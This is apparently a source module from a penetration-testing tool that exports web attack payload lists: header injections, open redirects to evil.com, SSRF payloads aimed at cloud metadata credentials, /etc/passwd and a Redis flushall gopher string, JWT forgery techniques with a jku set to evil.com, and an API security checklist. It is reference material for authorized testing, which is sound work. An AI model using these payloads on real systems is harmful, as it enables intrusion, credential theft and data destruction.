/**
 * DARKNODE — Web Security Testing Payloads Database
 * Reference payloads for authorized security testing
 * Copyright 2024-2026 Darknode Project. All rights reserved.
 * FOR AUTHORIZED PENETRATION TESTING ONLY.
 */

export const HEADER_INJECTIONS = [
  { name: 'Host Header Override', header: 'X-Forwarded-Host', value: 'evil.com', purpose: 'Test host header injection for password reset poisoning, cache poisoning', severity: 'high' },
  { name: 'X-Forwarded-For Spoof', header: 'X-Forwarded-For', value: '127.0.0.1', purpose: 'Bypass IP-based access controls', severity: 'medium' },
  { name: 'X-Original-URL Override', header: 'X-Original-URL', value: '/admin', purpose: 'Bypass front-end access controls (IIS/nginx reverse proxy)', severity: 'high' },
  { name: 'X-Rewrite-URL Override', header: 'X-Rewrite-URL', value: '/admin', purpose: 'Bypass URL-based access controls', severity: 'high' },
  { name: 'Referer Injection', header: 'Referer', value: 'https://admin.target.com/', purpose: 'Bypass referer-based CSRF or access controls', severity: 'medium' },
  { name: 'Content-Type Switch', header: 'Content-Type', value: 'application/xml', purpose: 'Trigger XML parser for XXE testing', severity: 'high' },
  { name: 'Accept Manipulation', header: 'Accept', value: 'application/json, text/javascript, */*', purpose: 'Force different response format to expose API data', severity: 'low' },
  { name: 'X-HTTP-Method-Override', header: 'X-HTTP-Method-Override', value: 'DELETE', purpose: 'Override HTTP method to test hidden functionality', severity: 'medium' },
  { name: 'Origin Manipulation', header: 'Origin', value: 'null', purpose: 'Test CORS misconfigurations with null origin', severity: 'high' },
  { name: 'Transfer-Encoding Smuggling', header: 'Transfer-Encoding', value: 'chunked', purpose: 'HTTP request smuggling via TE.CL desync', severity: 'critical' }
];

export const OPEN_REDIRECT_PATTERNS = [
  { pattern: '//evil.com', description: 'Protocol-relative redirect', bypass: 'Passes many URL validators' },
  { pattern: '/\\evil.com', description: 'Backslash normalization', bypass: 'Some parsers normalize \\ to /' },
  { pattern: '/%2f/evil.com', description: 'URL-encoded slash', bypass: 'Bypasses slash-based checks' },
  { pattern: '/redirect?url=https://evil.com', description: 'Query parameter redirect', bypass: 'Common redirect parameter' },
  { pattern: '/@evil.com', description: 'At-sign redirect', bypass: 'URL authority confusion' },
  { pattern: '/redirect?url=evil.com%23.target.com', description: 'Fragment bypass', bypass: 'Fragment hides real domain check' },
  { pattern: '/redirect?url=https://target.com@evil.com', description: 'Authority confusion', bypass: 'Browser navigates to evil.com' },
  { pattern: '/redirect?url=javascript:alert(1)', description: 'JavaScript protocol', bypass: 'If protocol not validated' },
  { pattern: '/redirect?url=data:text/html,<script>alert(1)</script>', description: 'Data URI', bypass: 'Leads to XSS via redirect' },
  { pattern: '/redirect?url=https://evil.com%00.target.com', description: 'Null byte truncation', bypass: 'Some parsers stop at null byte' }
];

export const SSRF_PAYLOADS = [
  { payload: 'http://127.0.0.1/', target: 'Localhost', purpose: 'Access internal services on the server' },
  { payload: 'http://[::1]/', target: 'IPv6 localhost', purpose: 'Bypass IPv4 localhost filters' },
  { payload: 'http://0/', target: 'Zero IP', purpose: 'Alternative localhost representation' },
  { payload: 'http://0x7f000001/', target: 'Hex localhost', purpose: 'Hex-encoded 127.0.0.1' },
  { payload: 'http://2130706433/', target: 'Decimal localhost', purpose: 'Decimal representation of 127.0.0.1' },
  { payload: 'http://169.254.169.254/', target: 'AWS IMDS', purpose: 'Access cloud metadata (steal IAM credentials)' },
  { payload: 'http://metadata.google.internal/', target: 'GCP Metadata', purpose: 'Access GCP metadata service' },
  { payload: 'http://169.254.169.254/metadata/v1/', target: 'DigitalOcean Metadata', purpose: 'Access DO droplet metadata' },
  { payload: 'file:///etc/passwd', target: 'Local file', purpose: 'Read local files via file:// protocol' },
  { payload: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall', target: 'Redis via Gopher', purpose: 'Execute Redis commands via SSRF' },
  { payload: 'dict://127.0.0.1:6379/info', target: 'Redis via DICT', purpose: 'Enumerate Redis via DICT protocol' },
  { payload: 'http://internal-service.local/', target: 'Internal DNS', purpose: 'Access internal services by hostname' }
];

export const JWT_ATTACK_TECHNIQUES = [
  { name: 'Algorithm None Attack', description: 'Change alg header to "none" and remove signature. If server accepts unsigned tokens, authentication is bypassed.', payload: '{"alg":"none","typ":"JWT"}', severity: 'critical' },
  { name: 'Algorithm Confusion (RS256 to HS256)', description: 'If server uses RS256, change to HS256 and sign with the public key as HMAC secret. Server may verify with the public key as symmetric key.', payload: 'Change alg: RS256 → HS256, sign with PEM public key', severity: 'critical' },
  { name: 'Weak Secret Brute Force', description: 'HS256 tokens with weak secrets can be brute-forced offline using tools like hashcat or jwt-cracker.', payload: 'hashcat -m 16500 jwt.txt wordlist.txt', severity: 'high' },
  { name: 'JWK Injection', description: 'Inject a JWK (JSON Web Key) in the JWT header containing your own key. If server fetches keys from the header, you control the signing key.', payload: 'Add jwk header with attacker-generated RSA key', severity: 'critical' },
  { name: 'JKU/x5u Header Injection', description: 'Point jku (JWK Set URL) or x5u (X.509 URL) to attacker-controlled server hosting your signing keys.', payload: 'Set jku: https://evil.com/.well-known/jwks.json', severity: 'critical' },
  { name: 'Kid Injection (SQL/Path)', description: 'The kid (Key ID) parameter may be vulnerable to SQL injection or path traversal if used in database/file lookups.', payload: 'kid: "../../dev/null" or kid: "\' UNION SELECT \'secret\' --"', severity: 'critical' },
  { name: 'Claim Tampering', description: 'Modify JWT claims (sub, role, admin) if signature is not properly verified.', payload: 'Change "role":"user" to "role":"admin"', severity: 'high' },
  { name: 'Token Lifetime Abuse', description: 'Use expired tokens if expiration (exp) is not validated server-side.', payload: 'Use token with past exp timestamp', severity: 'medium' }
];

export const API_SECURITY_TESTS = [
  { category: 'Authentication', test: 'Test with no auth header', method: 'Remove Authorization header', expected: '401 Unauthorized', severity: 'critical' },
  { category: 'Authentication', test: 'Test with expired token', method: 'Use token with past exp claim', expected: '401 Unauthorized', severity: 'high' },
  { category: 'Authentication', test: 'Test token from different user', method: 'Use valid token from user A on user B endpoint', expected: '403 Forbidden', severity: 'critical' },
  { category: 'Authorization', test: 'IDOR on user resources', method: 'Change user ID in URL/body (e.g. /api/users/123 → /api/users/124)', expected: '403 Forbidden', severity: 'critical' },
  { category: 'Authorization', test: 'Privilege escalation', method: 'Access admin endpoints with regular user token', expected: '403 Forbidden', severity: 'critical' },
  { category: 'Authorization', test: 'HTTP method tampering', method: 'Use PUT/DELETE on read-only endpoints', expected: '405 Method Not Allowed', severity: 'high' },
  { category: 'Input Validation', test: 'SQL injection in parameters', method: "Add ' OR 1=1-- to query params", expected: 'Proper error, not data leak', severity: 'critical' },
  { category: 'Input Validation', test: 'XSS in stored data', method: 'Submit <script>alert(1)</script> in text fields', expected: 'Sanitized output', severity: 'high' },
  { category: 'Input Validation', test: 'Mass assignment', method: 'Add extra fields like role, admin, isVerified to request body', expected: 'Extra fields ignored', severity: 'high' },
  { category: 'Rate Limiting', test: 'Brute force protection', method: 'Send 100 login requests in 10 seconds', expected: '429 Too Many Requests', severity: 'high' },
  { category: 'Rate Limiting', test: 'API abuse prevention', method: 'Send 1000 requests to an endpoint rapidly', expected: '429 or throttling', severity: 'medium' },
  { category: 'Data Exposure', test: 'Excessive data in responses', method: 'Check if API returns password hashes, tokens, or internal fields', expected: 'Only necessary fields returned', severity: 'high' },
  { category: 'Data Exposure', test: 'Error message verbosity', method: 'Trigger errors with invalid input', expected: 'Generic error messages, no stack traces', severity: 'medium' },
  { category: 'CORS', test: 'Wildcard origin', method: 'Check Access-Control-Allow-Origin header', expected: 'Specific origins, not *', severity: 'medium' },
  { category: 'CORS', test: 'Null origin acceptance', method: 'Send request with Origin: null', expected: 'Not reflected', severity: 'high' }
];
